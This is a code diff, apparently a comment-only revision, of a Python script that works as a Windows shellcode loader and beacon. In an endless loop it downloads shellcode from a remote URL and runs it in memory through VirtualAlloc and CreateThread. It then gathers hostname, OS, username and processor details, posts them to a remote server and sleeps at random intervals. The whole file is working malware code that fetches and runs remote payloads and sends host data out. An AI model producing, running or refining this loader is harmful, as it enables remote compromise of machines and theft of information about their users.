@@ -31,19 +31,19 @@ def download_shellcode(url):
 
 def execute_shellcode(shellcode):
     """
-    Executes the provided shellcode in memory.
+    Executes the provided shellcode in memory using VirtualAlloc and CreateThread.
 
     :param shellcode: Bytes of shellcode to execute
     """
-    kernel32 = ctypes.windll.kernel32
-    shellcode_size = len(shellcode)
+    kernel32 = ctypes.windll.kernel32  # Access to Windows kernel32.dll
+    shellcode_size = len(shellcode)   # Determine size of shellcode in bytes
 
-    # Allocate memory for the shellcode
+    # Allocate memory in the process's address space
     ptr = kernel32.VirtualAlloc(
-        None,
-        shellcode_size,
-        0x3000,  # MEM_COMMIT | MEM_RESERVE
-        0x40     # PAGE_EXECUTE_READWRITE
+        None,                       # Let the system decide the base address
+        shellcode_size,             # Size of allocation in bytes
+        0x3000,                     # MEM_COMMIT | MEM_RESERVE
+        0x40                        # PAGE_EXECUTE_READWRITE
     )
 
     # Copy shellcode into the allocated memory
@@ -51,36 +51,37 @@ def execute_shellcode(shellcode):
     ctypes.memmove(ptr, buf, shellcode_size)
 
     # Create a thread to execute the shellcode
-    thread_id = ctypes.c_ulong(0)
+    thread_id = ctypes.c_ulong(0)   # Placeholder for thread ID
     if not kernel32.CreateThread(
-        None,
-        0,
-        ctypes.c_void_p(ptr),
-        None,
-        0,
-        ctypes.byref(thread_id)
+        None,                       # Default security descriptor
+        0,                          # Default stack size
+        ctypes.c_void_p(ptr),       # Start address of thread
+        None,                       # No arguments to pass
+        0,                          # Run immediately
+        ctypes.byref(thread_id)     # Pointer to store thread ID
     ):
-        raise ctypes.WinError()
+        raise ctypes.WinError()     # Raise exception if thread creation fails
 
-    # Wait for the thread to execute
+    # Wait indefinitely for the thread to finish executing
     kernel32.WaitForSingleObject(ctypes.c_void_p(thread_id), -1)
 
 def send_metadata(url, metadata):
     """
-    Sends metadata to the provided URL.
+    Sends metadata to the provided URL using a JSON-encoded POST request.
 
     :param url: String URL to send metadata to
     :param metadata: Dictionary of metadata to send
     """
     try:
+        # Prepare the request with JSON-encoded metadata
         req = urllib.request.Request(
             url,
-            data=json.dumps(metadata).encode('utf-8'),  # JSON encode and UTF-8 encode the metadata
-            headers={'Content-Type': 'application/json'}
+            data=json.dumps(metadata).encode('utf-8'),  # Encode metadata as JSON
+            headers={'Content-Type': 'application/json'}  # Specify JSON content type
         )
-        urllib.request.urlopen(req)  # Execute POST request
+        urllib.request.urlopen(req)  # Execute the POST request
     except Exception as e:
-        print(f"Failed to send metadata: {e}")  # Handle errors
+        print(f"Failed to send metadata: {e}")  # Handle errors if request fails
 
 def get_metadata():
     """
@@ -89,13 +90,13 @@ def get_metadata():
     :return: Dictionary containing metadata
     """
     return {
-        "hostname": platform.node(),               # Hostname
-        "os": platform.system(),                   # Operating system
-        "os_version": platform.version(),          # OS version
-        "architecture": platform.machine(),        # System architecture
-        "processor": platform.processor(),         # Processor information
-        "user": os.getlogin(),                     # Current username
-        "uuid": str(uuid.uuid4())                  # Unique identifier
+        "hostname": platform.node(),               # Get hostname of the system
+        "os": platform.system(),                   # Get operating system name
+        "os_version": platform.version(),          # Get OS version information
+        "architecture": platform.machine(),        # Get system architecture
+        "processor": platform.processor(),         # Get processor information
+        "user": os.getlogin(),                     # Get current username
+        "uuid": str(uuid.uuid4())                  # Generate and get a UUID
     }
 
 def main():
@@ -105,12 +106,13 @@ def main():
     while True:
         shellcode = download_shellcode(shellcode_url)  # Fetch the shellcode
         if shellcode:
-            execute_shellcode(shellcode)  # Execute if successful
+            execute_shellcode(shellcode)  # Execute if shellcode download is successful
 
         metadata = get_metadata()  # Collect system metadata
         send_metadata(metadata_url, metadata)  # Send the metadata
 
-        sleep_time = random.randint(polling_interval_min, polling_interval_max)  # Random sleep interval
+        # Randomly determine sleep time within specified range
+        sleep_time = random.randint(polling_interval_min, polling_interval_max)
         time.sleep(sleep_time)  # Sleep for determined interval
 
 if __name__ == "__main__":
